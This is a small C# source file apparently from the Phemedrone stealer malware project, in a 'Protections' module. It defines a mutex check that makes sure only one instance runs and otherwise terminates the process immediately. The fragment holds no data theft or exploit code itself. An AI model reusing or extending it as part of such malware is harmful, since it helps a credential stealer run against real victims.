using System;
using System.Threading;

namespace Phemedrone.Protections
{
    public class MutexCheck
    {
        private static bool Opened;
        public static Mutex Mutex = new(true, Config.MutexValue, out Opened);

        public static void Check()
        {
            if (!Opened)
            {
                Environment.FailFast("");
            }
        }
    }
}